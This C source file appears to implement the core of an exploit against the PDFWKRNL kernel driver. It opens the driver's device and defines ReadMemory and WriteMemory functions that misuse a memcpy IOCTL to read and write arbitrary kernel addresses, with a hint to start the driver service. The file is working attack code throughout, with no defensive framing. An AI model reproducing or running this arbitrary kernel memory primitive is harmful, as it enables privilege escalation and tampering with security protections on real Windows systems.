#include "driver.h"
#include <stdio.h>

static_assert(sizeof(PDFW_MEMCPY) == 48, "sizeof PDFW_MEMCPY must be 48 bytes");

HANDLE OpenDevice(void) {
    HANDLE device = CreateFileW(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (device == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CreateFileW failed: %lu\n", GetLastError());
        fprintf(stderr, "    Ensure PDFWKRNL service is running (sc start PDFWKRNL)\n");
        return NULL;
    }

    return device;
}

BOOL WriteMemory(HANDLE driver, DWORD64 address, PVOID buffer, DWORD size) {
    PDFW_MEMCPY request;
    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = (PVOID)address;
    request.Source = buffer;
    request.Size = size;

    DWORD bytesReturned = 0;
    return DeviceIoControl(driver, IOCTL_MEMCPY, &request, sizeof(request), &request, sizeof(request), &bytesReturned, NULL);
}

BOOL ReadMemory(HANDLE driver, DWORD64 address, PVOID buffer, DWORD size) {
    PDFW_MEMCPY request;
    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = buffer;
    request.Source = (PVOID)address;
    request.Size = size;

    DWORD bytesReturned = 0;
    return DeviceIoControl(driver, IOCTL_MEMCPY, &request, sizeof(request), &request, sizeof(request), &bytesReturned, NULL);
}

DWORD64 ReadMemoryDWORD64(HANDLE driver, DWORD64 address) {
    DWORD64 val = 0;
    if (ReadMemory(driver, address, &val, 8)) return val;
    return 0;
}
